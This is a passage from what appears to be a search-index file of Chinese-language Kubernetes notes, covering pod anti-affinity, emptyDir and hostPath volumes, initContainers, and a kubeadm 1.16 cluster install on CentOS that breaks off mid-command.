Running 0 7m 10.192.2.3 kube-node-1 web-server-1287567482-6f7v5 1/1 Running 0 7m 10.192.4.3 kube-node-3 web-server-1287567482-s330j 1/1 Running 0 7m 10.192.3.2 kube-node-2","title":"\u59cb\u7ec8\u5728\u540c\u4e00\u4e2a\u8282\u70b9\u59cb\u7ec8\u5728\u540c\u4e00\u4e2a\u8282\u70b9"},{"location":"lxc/kubernetes/dispatch/#_4","text":"\u4e0a\u9762\u7684\u4f8b\u5b50\u4f7f\u7528\u4e86 PodAntiAffinity \u89c4\u5219\u4e0e topologyKey: \"kubernetes.io/hostname\" \u6765\u90e8\u7f72 redis \u96c6\u7fa4\uff0c\u56e0\u6b64\u6ca1\u6709\u4efb\u4f55\u4e24\u4e2a\u526f\u672c\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u3002\u53c2\u8003 ZooKeeper tutorial (opens new window) \u4e86\u89e3\u5982\u4f55\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u5f0f\u4e3a StatefulSet \u914d\u7f6e\u53cd\u4eb2\u548c\u6027\u4ee5\u5b9e\u73b0\u9ad8\u53ef\u7528\u3002 http://bazingafeng.com/2019/03/31/k8s-affinity-topologykey/ https://kuboard.cn/learning/k8s-intermediate/config/affinity.html","title":"\u59cb\u7ec8\u4e0d\u5728\u76f8\u540c\u7684\u8282\u70b9\u4e0a"},{"location":"lxc/kubernetes/emptyDir/","text":"emptyDir emptyDir\u7c7b\u578b\u7684\u5b58\u50a8\u5377\u521b\u5efa\u4e8ePod\u88ab\u8c03\u5ea6\u5230\u5bbf\u4e3b\u673a\u4e0a\u7684\u65f6\u5019\uff0c\u540c\u4e00\u4e2aPod\u5185\u7684\u591a\u4e2a\u5bb9\u5668\u80fd\u8bfb\u5199emptyDir\u4e2d\u7684\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e00\u65e6\u8fd9\u4e2aPod\u9500\u6bc1\u6216\u8005\u6f02\u79fb\u5f00\u8be5\u5bbf\u4e3b\u673a\uff0cemptyDir\u4e2d\u7684\u6570\u636e\u5c31\u4f1a\u88ab\u6c38\u4e45\u5220\u9664\u3002emptyDir\u7c7b\u578b\u7684\u5b58\u50a8\u5377\u4e3b\u8981\u7528\u4f5c\u4e34\u65f6\u7a7a\u95f4\u6216\u8005\u4e0d\u540c\u5bb9\u5668\u4e4b\u95f4\u7684\u6570\u636e\u5171\u4eab\u3002\u5bb9\u5668\u7684crashing\u4e8b\u4ef6\u5e76\u4e0d\u4f1a\u5bfc\u81f4emptyDir\u4e2d\u7684\u6570\u636e\u88ab\u5220\u9664\u3002 emptyDir\u652f\u6301\u5185\u5b58\u4f5c\u4e3a\u5b58\u50a8\u8d44\u6e90\uff0cemptyDir.medium\u8bbe\u4e3aMemory\u5373\u53ef\uff0c\u4f46\u5982\u679c\u9047\u5230node\u8282\u70b9\u91cd\u542f\uff0cemptyDir\u4e2d\u7684\u6570\u636e\u4e5f\u4f1a\u5168\u90e8\u4e22\u5931\u3002 \u4ee5\u4e0b\u6f14\u793a\u5982\u4f55\u5728Pod\u4e2d\u4e0d\u540c\u5bb9\u5668\u4e4b\u95f4\u5171\u4eab\u6570\u636e\u3002 vi emptydir-pod.yaml apiVersion: v1 kind: Pod metadata: name: emptydir-pod spec: #\u5b9a\u4e49emptyDir\u5b58\u50a8\u5377\uff0c\u540d\u79f0my-emptydir-vol volumes: - name: my-emptydir-vol emptyDir: {} containers: - name: busybox-1 image: busybox:latest command: - \"sleep\" - \"3600\" #\u5c06my-emptydir-vol\u5b58\u50a8\u5377Mount\u5230\u5bb9\u5668\u4e2d volumeMounts: - name: my-emptydir-vol #\u6b64\u8def\u5f84\u4e3a\u5bb9\u5668\u4e2d\u76ee\u5f55 mountPath: /data-1 - name: busybox-2 image: busybox:latest command: - \"sleep\" - \"3600\" #\u5c06my-emptydir-vol\u5b58\u50a8\u5377Mount\u5230\u5bb9\u5668\u4e2d volumeMounts: - name: my-emptydir-vol mountPath: /data-2 kubectl apply -f emptydir-pod.yaml \u8fdb\u5165\u5bb9\u5668busybox-1\uff0c\u5b58\u5728/data-1\u76ee\u5f55 kubectl exec -it emptydir-pod -c busybox-1 sh ls bin data-1 dev etc home proc root sys tmp usr var \u5728\u5bb9\u5668busybox-1\u5411\u5171\u4eab\u76ee\u5f55\u4e2d/data-1\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6 cd data-1 echo \"hello world\" > hello.txt exit \u5bb9\u5668busybox-2\u7684\u5171\u4eab\u76ee\u5f55\u4e2d/data-2\u786e\u5b9e\u80fd\u591f\u8bbf\u95ee\u5bb9\u5668busybox-1\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u6ce8\u610fbusybox-1:/data-1 = busybox-2:/data-2 kubectl exec -it emptydir-pod -c busybox-2 sh cat /data-2/hello.txt hello world exit \u6211\u4eec\u770b\u770bemptyDir\u5b58\u50a8\u5377\u5728\u5bbf\u4e3b\u673a\u7684\u4f4d\u7f6e\u3002\u5728k8s-node1\u8282\u70b9\uff0c\u5728Pod\u4e34\u65f6\u76ee\u5f55\u4e0b\u5b58\u5728my-emptydir-vol\u76ee\u5f55\uff0c\u5bb9\u5668\u521b\u5efa\u7684\u6587\u4ef6\u5c31\u5b58\u653e\u5728\u8be5\u76ee\u5f55\u4e2d\u3002Pod\u7684\u4e34\u65f6\u76ee\u5f55\u4f1a\u5728Pod\u9500\u6bc1\u65f6\u5220\u9664\uff0c\u5176\u4e2dmy-emptydir-vol\u4e5f\u4f1a\u88ab\u9644\u5e26\u5220\u9664\u3002 kubectl get pod -o yaml | grep nodeName nodeName: k8s-node1 kubectl get pod -o yaml | grep uid uid: e70923f9-156a-4fde-98be-e77f3f65fbd9 #\u5728k8s-node1\u8282\u70b9 tree /var/lib/kubelet/pods/e70923f9-156a-4fde-98be-e77f3f65fbd9/ /var/lib/kubelet/pods/e70923f9-156a-4fde-98be-e77f3f65fbd9/ \u251c\u2500\u2500 containers \u2502 \u251c\u2500\u2500 busybox-1 \u2502 \u2502 \u251c\u2500\u2500 753e3ae2 \u2502 \u2502 \u2514\u2500\u2500 96560e76 \u2502 \u2514\u2500\u2500 busybox-2 \u2502 \u251c\u2500\u2500 1a8b5849 \u2502 \u2514\u2500\u2500 a6a696a2 \u251c\u2500\u2500 etc-hosts \u251c\u2500\u2500 plugins \u2502 \u2514\u2500\u2500 kubernetes.io~empty-dir \u2502 \u251c\u2500\u2500 my-emptydir-vol \u2502 \u2502 \u2514\u2500\u2500 ready \u2502 \u2514\u2500\u2500 wrapped_default-token-wtqgl \u2502 \u2514\u2500\u2500 ready \u2514\u2500\u2500 volumes \u251c\u2500\u2500 kubernetes.io~empty-dir \u2502 \u2514\u2500\u2500 my-emptydir-vol \u2502 \u2514\u2500\u2500 hello.txt \u2514\u2500\u2500 kubernetes.io~secret \u2514\u2500\u2500 default-token-wtqgl \u251c\u2500\u2500 ca.crt -> ..data/ca.crt \u251c\u2500\u2500 namespace -> ..data/namespace \u2514\u2500\u2500 token -> ..data/token cat /var/lib/kubelet/pods/e70923f9-156a-4fde-98be-e77f3f65fbd9/volumes/kubernetes.io~empty-dir/my-emptydir-vol/hello.txt hello world \u5220\u9664Pod\uff0c\u67e5\u770bPod\u4e34\u65f6\u76ee\u5f55\u3002\u53d1\u73b0\u5df2\u7ecf\u6ca1\u6709Pod\u4e34\u65f6\u76ee\u5f55e70923f9-156a-4fde-98be-e77f3f65fbd9\u4e86\u3002 kubectl delete -f emptydir-pod.yaml #\u5728k8s-node1\u8282\u70b9 ls /var/lib/kubelet/pods/","title":"emptyDir"},{"location":"lxc/kubernetes/emptyDir/#emptydir","text":"emptyDir\u7c7b\u578b\u7684\u5b58\u50a8\u5377\u521b\u5efa\u4e8ePod\u88ab\u8c03\u5ea6\u5230\u5bbf\u4e3b\u673a\u4e0a\u7684\u65f6\u5019\uff0c\u540c\u4e00\u4e2aPod\u5185\u7684\u591a\u4e2a\u5bb9\u5668\u80fd\u8bfb\u5199emptyDir\u4e2d\u7684\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e00\u65e6\u8fd9\u4e2aPod\u9500\u6bc1\u6216\u8005\u6f02\u79fb\u5f00\u8be5\u5bbf\u4e3b\u673a\uff0cemptyDir\u4e2d\u7684\u6570\u636e\u5c31\u4f1a\u88ab\u6c38\u4e45\u5220\u9664\u3002emptyDir\u7c7b\u578b\u7684\u5b58\u50a8\u5377\u4e3b\u8981\u7528\u4f5c\u4e34\u65f6\u7a7a\u95f4\u6216\u8005\u4e0d\u540c\u5bb9\u5668\u4e4b\u95f4\u7684\u6570\u636e\u5171\u4eab\u3002\u5bb9\u5668\u7684crashing\u4e8b\u4ef6\u5e76\u4e0d\u4f1a\u5bfc\u81f4emptyDir\u4e2d\u7684\u6570\u636e\u88ab\u5220\u9664\u3002 emptyDir\u652f\u6301\u5185\u5b58\u4f5c\u4e3a\u5b58\u50a8\u8d44\u6e90\uff0cemptyDir.medium\u8bbe\u4e3aMemory\u5373\u53ef\uff0c\u4f46\u5982\u679c\u9047\u5230node\u8282\u70b9\u91cd\u542f\uff0cemptyDir\u4e2d\u7684\u6570\u636e\u4e5f\u4f1a\u5168\u90e8\u4e22\u5931\u3002 \u4ee5\u4e0b\u6f14\u793a\u5982\u4f55\u5728Pod\u4e2d\u4e0d\u540c\u5bb9\u5668\u4e4b\u95f4\u5171\u4eab\u6570\u636e\u3002 vi emptydir-pod.yaml apiVersion: v1 kind: Pod metadata: name: emptydir-pod spec: #\u5b9a\u4e49emptyDir\u5b58\u50a8\u5377\uff0c\u540d\u79f0my-emptydir-vol volumes: - name: my-emptydir-vol emptyDir: {} containers: - name: busybox-1 image: busybox:latest command: - \"sleep\" - \"3600\" #\u5c06my-emptydir-vol\u5b58\u50a8\u5377Mount\u5230\u5bb9\u5668\u4e2d volumeMounts: - name: my-emptydir-vol #\u6b64\u8def\u5f84\u4e3a\u5bb9\u5668\u4e2d\u76ee\u5f55 mountPath: /data-1 - name: busybox-2 image: busybox:latest command: - \"sleep\" - \"3600\" #\u5c06my-emptydir-vol\u5b58\u50a8\u5377Mount\u5230\u5bb9\u5668\u4e2d volumeMounts: - name: my-emptydir-vol mountPath: /data-2 kubectl apply -f emptydir-pod.yaml \u8fdb\u5165\u5bb9\u5668busybox-1\uff0c\u5b58\u5728/data-1\u76ee\u5f55 kubectl exec -it emptydir-pod -c busybox-1 sh ls bin data-1 dev etc home proc root sys tmp usr var \u5728\u5bb9\u5668busybox-1\u5411\u5171\u4eab\u76ee\u5f55\u4e2d/data-1\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6 cd data-1 echo \"hello world\" > hello.txt exit \u5bb9\u5668busybox-2\u7684\u5171\u4eab\u76ee\u5f55\u4e2d/data-2\u786e\u5b9e\u80fd\u591f\u8bbf\u95ee\u5bb9\u5668busybox-1\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u6ce8\u610fbusybox-1:/data-1 = busybox-2:/data-2 kubectl exec -it emptydir-pod -c busybox-2 sh cat /data-2/hello.txt hello world exit \u6211\u4eec\u770b\u770bemptyDir\u5b58\u50a8\u5377\u5728\u5bbf\u4e3b\u673a\u7684\u4f4d\u7f6e\u3002\u5728k8s-node1\u8282\u70b9\uff0c\u5728Pod\u4e34\u65f6\u76ee\u5f55\u4e0b\u5b58\u5728my-emptydir-vol\u76ee\u5f55\uff0c\u5bb9\u5668\u521b\u5efa\u7684\u6587\u4ef6\u5c31\u5b58\u653e\u5728\u8be5\u76ee\u5f55\u4e2d\u3002Pod\u7684\u4e34\u65f6\u76ee\u5f55\u4f1a\u5728Pod\u9500\u6bc1\u65f6\u5220\u9664\uff0c\u5176\u4e2dmy-emptydir-vol\u4e5f\u4f1a\u88ab\u9644\u5e26\u5220\u9664\u3002 kubectl get pod -o yaml | grep nodeName nodeName: k8s-node1 kubectl get pod -o yaml | grep uid uid: e70923f9-156a-4fde-98be-e77f3f65fbd9 #\u5728k8s-node1\u8282\u70b9 tree /var/lib/kubelet/pods/e70923f9-156a-4fde-98be-e77f3f65fbd9/ /var/lib/kubelet/pods/e70923f9-156a-4fde-98be-e77f3f65fbd9/ \u251c\u2500\u2500 containers \u2502 \u251c\u2500\u2500 busybox-1 \u2502 \u2502 \u251c\u2500\u2500 753e3ae2 \u2502 \u2502 \u2514\u2500\u2500 96560e76 \u2502 \u2514\u2500\u2500 busybox-2 \u2502 \u251c\u2500\u2500 1a8b5849 \u2502 \u2514\u2500\u2500 a6a696a2 \u251c\u2500\u2500 etc-hosts \u251c\u2500\u2500 plugins \u2502 \u2514\u2500\u2500 kubernetes.io~empty-dir \u2502 \u251c\u2500\u2500 my-emptydir-vol \u2502 \u2502 \u2514\u2500\u2500 ready \u2502 \u2514\u2500\u2500 wrapped_default-token-wtqgl \u2502 \u2514\u2500\u2500 ready \u2514\u2500\u2500 volumes \u251c\u2500\u2500 kubernetes.io~empty-dir \u2502 \u2514\u2500\u2500 my-emptydir-vol \u2502 \u2514\u2500\u2500 hello.txt \u2514\u2500\u2500 kubernetes.io~secret \u2514\u2500\u2500 default-token-wtqgl \u251c\u2500\u2500 ca.crt -> ..data/ca.crt \u251c\u2500\u2500 namespace -> ..data/namespace \u2514\u2500\u2500 token -> ..data/token cat /var/lib/kubelet/pods/e70923f9-156a-4fde-98be-e77f3f65fbd9/volumes/kubernetes.io~empty-dir/my-emptydir-vol/hello.txt hello world \u5220\u9664Pod\uff0c\u67e5\u770bPod\u4e34\u65f6\u76ee\u5f55\u3002\u53d1\u73b0\u5df2\u7ecf\u6ca1\u6709Pod\u4e34\u65f6\u76ee\u5f55e70923f9-156a-4fde-98be-e77f3f65fbd9\u4e86\u3002 kubectl delete -f emptydir-pod.yaml #\u5728k8s-node1\u8282\u70b9 ls /var/lib/kubelet/pods/","title":"emptyDir"},{"location":"lxc/kubernetes/hostpath/","text":"1.\u4e3b\u673a\u5185\u76ee\u5f55\u6302\u8f7d\u5230pod\u4e2d \u628a\u672c\u5730\u76ee\u5f55\u6302\u8f7d\u5230POD\u4e2d [root@VM-0-16-centos ~]# cat host.yaml apiVersion: v1 kind: Pod metadata: name: nginx spec: containers: - image: nginx name: nginx volumeMounts: - mountPath: /xin name: volume volumes: - name: volume hostPath: path: /xin #\u67e5\u770b\u5bb9\u5668 [root@VM-0-16-centos ~]# kubectl exec -it nginx bash root@nginx:/# cd /xin root@nginx:/xin# touch hello root@nginx:/xin# exit #\u67e5\u770bPOD\u6240\u5728\u4e3b\u673a root@minikube-m02:/# ls /xin/ hello root@minikube-m02:/# cd /xin/ root@minikube-m02:/xin# touch helloworld #\u67e5\u770b\u5bb9\u5668 [root@VM-0-16-centos ~]# kubectl exec -it nginx bash root@nginx:/# ls /xin hello helloworld \u6b64\u65b9\u6cd5\u53ef\u4ee5\u628a\u4e3b\u673a\u76ee\u5f55\u6302\u8f7d\u5230\u5bb9\u5668\u4e0a\uff0c\u4f46\u662f\u4e0d\u80fd\u628a\u5bb9\u5668\u521d\u59cb\u5316\u540e\u7684\u76ee\u5f55\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u4e0a\uff0c\u4f8b\u5982\u3002\u628a/data \u6302\u8f7d\u5230 \u5bb9\u5668\u7684/etc\u76ee\u5f55\uff0c\u5bb9\u5668\u5c31\u4f1a\u8d77\u4e0d\u6765 \u6837\u4f8b\uff1a \u5e94\u7528\u8bbe\u7f6e\u4e3ahostpath\u5e76\u8bbe\u7f6e\u5c3d\u91cf\u4e0d\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u90e8\u7f72POD apiVersion: apps/v1 kind: Deployment metadata: name: infra-nginx namespace: default labels: app: infra-nginx version: infra-nginx-uat-podname spec: replicas: 2 progressDeadlineSeconds: 600 selector: matchLabels: app: infra-nginx template: metadata: labels: app: infra-nginx version: infra-nginx-uat-podname spec: containers: - image: nginx name: nginx volumeMounts: - mountPath: /yun name: volume volumes: - name: volume hostPath: path: /yun affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - infra-nginx topologyKey: kubernetes.io/hostname weight: 100","title":"\u4e3b\u673a\u5185\u76ee\u5f55\u6302\u8f7d\u5230pod\u4e2d"},{"location":"lxc/kubernetes/hostpath/#1pod","text":"\u628a\u672c\u5730\u76ee\u5f55\u6302\u8f7d\u5230POD\u4e2d [root@VM-0-16-centos ~]# cat host.yaml apiVersion: v1 kind: Pod metadata: name: nginx spec: containers: - image: nginx name: nginx volumeMounts: - mountPath: /xin name: volume volumes: - name: volume hostPath: path: /xin #\u67e5\u770b\u5bb9\u5668 [root@VM-0-16-centos ~]# kubectl exec -it nginx bash root@nginx:/# cd /xin root@nginx:/xin# touch hello root@nginx:/xin# exit #\u67e5\u770bPOD\u6240\u5728\u4e3b\u673a root@minikube-m02:/# ls /xin/ hello root@minikube-m02:/# cd /xin/ root@minikube-m02:/xin# touch helloworld #\u67e5\u770b\u5bb9\u5668 [root@VM-0-16-centos ~]# kubectl exec -it nginx bash root@nginx:/# ls /xin hello helloworld \u6b64\u65b9\u6cd5\u53ef\u4ee5\u628a\u4e3b\u673a\u76ee\u5f55\u6302\u8f7d\u5230\u5bb9\u5668\u4e0a\uff0c\u4f46\u662f\u4e0d\u80fd\u628a\u5bb9\u5668\u521d\u59cb\u5316\u540e\u7684\u76ee\u5f55\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u4e0a\uff0c\u4f8b\u5982\u3002\u628a/data \u6302\u8f7d\u5230 \u5bb9\u5668\u7684/etc\u76ee\u5f55\uff0c\u5bb9\u5668\u5c31\u4f1a\u8d77\u4e0d\u6765 \u6837\u4f8b\uff1a \u5e94\u7528\u8bbe\u7f6e\u4e3ahostpath\u5e76\u8bbe\u7f6e\u5c3d\u91cf\u4e0d\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u90e8\u7f72POD apiVersion: apps/v1 kind: Deployment metadata: name: infra-nginx namespace: default labels: app: infra-nginx version: infra-nginx-uat-podname spec: replicas: 2 progressDeadlineSeconds: 600 selector: matchLabels: app: infra-nginx template: metadata: labels: app: infra-nginx version: infra-nginx-uat-podname spec: containers: - image: nginx name: nginx volumeMounts: - mountPath: /yun name: volume volumes: - name: volume hostPath: path: /yun affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - infra-nginx topologyKey: kubernetes.io/hostname weight: 100","title":"1.\u4e3b\u673a\u5185\u76ee\u5f55\u6302\u8f7d\u5230pod\u4e2d"},{"location":"lxc/kubernetes/initContainers/","text":"\u5728Kubernetes\u4e2d\uff0c initContainers \u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u5bb9\u5668\uff0c\u5b83\u4eec\u5728Pod\u7684\u5e38\u89c4\uff08\u6216\u201c\u4e3b\u201d\uff09\u5bb9\u5668\u542f\u52a8\u4e4b\u524d\u8fd0\u884c\u3002 initContainers \u4e3b\u8981\u7528\u4e8e\u6267\u884c\u4e00\u4e9b\u9884\u5148\u8bbe\u7f6e\u6216\u521d\u59cb\u5316\u4efb\u52a1\uff0c\u8fd9\u4e9b\u4efb\u52a1\u5fc5\u987b\u5728Pod\u7684\u4e3b\u5bb9\u5668\u542f\u52a8\u524d\u5b8c\u6210\u3002\u4e00\u65e6\u6240\u6709\u7684 initContainer \u6309\u987a\u5e8f\u6210\u529f\u8fd0\u884c\u5b8c\u6bd5\uff0cKubernetes\u624d\u4f1a\u542f\u52a8Pod\u4e2d\u7684\u4e3b\u5bb9\u5668\u3002 initContainers \u7684\u7279\u70b9\u5305\u62ec\uff1a 1.\u6267\u884c\u987a\u5e8f \uff1a\u5728\u540c\u4e00\u4e2aPod\u4e2d\uff0c initContainers \u6309\u7167\u5b83\u4eec\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u987a\u5e8f\u4f9d\u6b21\u6267\u884c\u3002\u6bcf\u4e2a initContainer \u5fc5\u987b\u6210\u529f\u5b8c\u6210\uff08\u5373\u9000\u51fa\u72b6\u6001\u4e3a0\uff09\u540e\uff0c\u4e0b\u4e00\u4e2a initContainer \u624d\u4f1a\u5f00\u59cb\u8fd0\u884c\u3002 2.\u72ec\u7acb\u6027 \uff1a initContainers \u548c\u4e3b\u5bb9\u5668\u76f8\u4e92\u72ec\u7acb\u3002\u5b83\u4eec\u53ef\u4ee5\u6709\u4e0d\u540c\u7684\u955c\u50cf\u3001\u8d44\u6e90\u9650\u5236\u548c\u5b89\u5168\u8bbe\u7f6e\u3002 3.\u521d\u59cb\u5316\u4efb\u52a1 \uff1a initContainers \u901a\u5e38\u7528\u4e8e\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u4efb\u52a1\uff0c\u5982\u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6\u3001\u4e0b\u8f7d\u6570\u636e\u3001\u7b49\u5f85\u5176\u4ed6\u670d\u52a1\u542f\u52a8\u3001\u6570\u636e\u5e93\u8fc1\u79fb\u7b49\u3002 4.\u8d44\u6e90\u5171\u4eab \uff1a initContainers \u53ef\u4ee5\u4e0e\u4e3b\u5bb9\u5668\u5171\u4eab\u6570\u636e\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u5171\u4eab\u5377\u3002\u8fd9\u5141\u8bb8 initContainers \u51c6\u5907\u6216\u4fee\u6539\u6570\u636e\uff0c\u4f9b\u4e3b\u5bb9\u5668\u4f7f\u7528\u3002 5.\u6545\u969c\u5904\u7406 \uff1a\u5982\u679c\u4efb\u4f55 initContainer \u5931\u8d25\uff0cKubernetes\u4f1a\u6839\u636e\u91cd\u542f\u7b56\u7565\uff08\u4f8b\u5982 Always \u3001 OnFailure \u6216 Never \uff09\u91cd\u8bd5\u8fd0\u884c\u8be5 initContainer \u3002\u5982\u679c\u65e0\u6cd5\u6210\u529f\u8fd0\u884c\uff0cPod\u5c06\u5904\u4e8e\u5931\u8d25\u72b6\u6001\u3002 \u4ee5\u4e0b\u662f\u4e00\u4e2a\u4f7f\u7528 initContainers \u7684\u793a\u4f8b\uff1a apiVersion: v1 kind: Pod metadata: name: mypod spec: containers: - name: main-container image: main-image initContainers: - name: init-myservice image: init-image command: ['sh', '-c', '\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u547d\u4ee4'] \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0cPod \u5305\u542b\u4e00\u4e2a\u540d\u4e3a init-myservice \u7684 initContainer \uff0c\u5b83\u5728 main-container \u542f\u52a8\u4e4b\u524d\u8fd0\u884c\u3002\u8fd9\u4e2a initContainer \u4f7f\u7528 init-image \u955c\u50cf\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u547d\u4ee4\u3002\u53ea\u6709\u5f53 initContainer \u6210\u529f\u5b8c\u6210\u540e\uff0c main-container \u624d\u4f1a\u542f\u52a8\u3002","title":"initContainers"},{"location":"lxc/kubernetes/kubernetes1.16/","text":"\u672c\u5730\u90e8\u7f72K8S 1.16 \u5b9e\u9a8c\u73af\u5883\uff1a \u4e3b\u673a\u540d IP\u5730\u5740 k8s\u7248\u672c master 192.168.70.130 v1.16.9 node1 192.168.70.141 v1.16.9 node1 192.168.70.142 v1.16.9 \u673a\u5668\u90fd\u5173\u95edselinux\u548c\u9632\u706b\u5899 \u4e09\u53f0\u673a\u5668\u90fd\u6267\u884c\uff1a # cat >> /etc/hosts << EOF 192.168.70.130 k8s-master 192.168.70.141 k8s-node1 192.168.70.142 k8s-node2 EOF # yum -y install wget vim # mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak # wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # yum clean all && yum makecache # yum install net-tools -y # sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab # \u4e34\u65f6\u7981\u7528 # swapoff -a # \u672c\u6587\u7684k8s\u7f51\u7edc\u4f7f\u7528flannel\uff0c\u8be5\u7f51\u7edc\u9700\u8981\u8bbe\u7f6e\u5185\u6838\u53c2\u6570bridge-nf-call-iptables=1\uff0c\u4fee\u6539\u8fd9\u4e2a\u53c2\u6570\u9700\u8981\u7cfb\u7edf\u6709br_netfilter\u6a21\u5757\u3002 # \u67e5\u770bbr_netfilter\u6a21\u5757\uff1a # lsmod |grep br_netfilter # \u5982\u679c\u7cfb\u7edf\u6ca1\u6709br_netfilter\u6a21\u5757\u5219\u6267\u884c\u4e0b\u9762\u7684\u65b0\u589e\u547d\u4ee4\uff0c\u5982\u6709\u5219\u5ffd\u7565 # \u4e34\u65f6\u65b0\u589ebr_netfilter\u6a21\u5757: # modprobe br_netfilter # lsmod |grep br_netfilter br_netfilter 22256 0 bridge 151336 1 br_netfilter # \u8be5\u65b9\u5f0f\u91cd\u542f\u540e\u4f1a\u5931\u6548 # \u6c38\u4e45\u65b0\u589ebr_netfilter\u6a21\u5757\uff1a # cat > /etc/rc.sysinit << EOF #!/bin/bash for file in /etc/sysconfig/modules/*.modules ; do [ -x $file ] && $file done EOF # cat > /etc/sysconfig/modules/br_netfilter.modules << EOF modprobe br_netfilter EOF # chmod 755 /etc/sysconfig/modules/br_netfilter.modules # cat <<EOF > /etc/sysctl.d/k8s.conf vm.swappiness = 0 net.bridge.bridge-nf-call-ip6tables = 1 net.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-iptables = 1 EOF # cat > /etc/sysconfig/modules/ipvs.modules <<EOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack EOF # chmod 755 /etc/sysconfig/modules/ipvs.modules && bash /etc/sysconfig/modules/ipvs.modules && lsmod | grep -e ip_vs -e nf_conntrack_ipv4 # yum install yum-utils device-mapper-persistent-data lvm2 openssl socat conntrack ebtables ipset # yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # yum list docker-ce --showduplicates | sort -r # yum install -y docker-ce-18.09.9 docker-ce-cli-18.09.9 containerd.io # systemctl enable docker && systemctl start docker # # mkdir /etc/docker # cat > /etc/docker/daemon.json <<EOF { # \"registry-mirrors\": [ \"https://registry.docker-cn.com\", \"http://hub-mirror.c.163.com\", \"https://docker.mirrors.ustc.edu.cn\" ], \"exec-opts\": [\"native.cgroupdriver=systemd\"], \"log-driver\": \"json-file\", \"log-opts\": { \"max-size\": \"100m\" }, \"storage-driver\": \"overlay2\", \"storage-opts\": [ \"overlay2.override_kernel_check=true\" ] } EOF # systemctl daemon-reload && systemctl restart docker # cat <<EOF > /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/ enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF # \u66f4\u65b0\u7f13\u5b58 # yum clean all # yum -y makecache # yum list kubelet --showduplicates | sort -r # yum install -y kubelet-1.16.9 kubeadm-1.16.9 kubectl-1.16.9 # systemctl enable kubelet.service && systemctl start kubelet # vi image.sh #!/bin/bash url=registry.cn-hangzhou.aliyuncs.com/google_containers version=v1.16.9 images=(`kubeadm config images list --kubernetes-version=$version|awk -F '/' '{print $2}'`) for imagename in ${images[@]} ; do docker pull $url/$imagename docker tag $url/$imagename k8s.gcr.io/$imagename docker rmi -f $url/$imagename done # chmod 777 image.sh # ./image.sh master\u6267\u884c\uff1a # kubeadm init \\ --apiserver-advertise-address=192.168.70.130 \\ --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers \\ --kubernetes-version v1.16.9 \\ --service-cidr=10.1.0.0/16 \\ --pod-network-cidr=10.244.0.0/16 W0628 09:01:05.568405 20714 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups ...\u7701\u7565... Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.70.130:6443 --token eufass.9mj0z1oafwjwna8y \\ --discovery-token-ca-cert-hash sha256:1899cb7904899c7377fa01ca452d7260241f2f333f6dfff1bc843f338224ffb9 # echo \"export KUBECONFIG=/etc/kubernetes/admin.conf\" >> ~/.bash_profile # source .bash_profile # mkdir -p $HOME/.kube # cp -i /etc/kubernetes/admin.conf $HOME/.kube/config # chown $(id -u):$(id -g) $HOME/.kube/config \u67e5\u770b\u96c6\u7fa4\u72b6\u6001 # kubectl get cs NAME AGE scheduler <unknown> controller-manager <unknown> etcd-0 <unknown> # kubectl get cs -o=go-template='{{printf \"|NAME|STATUS|MESSAGE|\\n\"}}{{range .items}}{{$name := .metadata.name}}{{range .conditions}}{{printf \"|%s|%s|%s|\\n\" $name .status .message}}{{end}}{{end}}' |NAME|STATUS|MESSAGE| |scheduler|True|ok| |controller-manager|True|ok| |etcd-0|True|{\"health\":\"true\"}| \u90e8\u7f72\u7f51\u7edc # \u8fd9\u4e2ayml\u6587\u4ef6\u53ef\u4ee5\u63d0\u524d\u4e0b\u8f7d\u4e0b\u6765 # kubectl apply -f 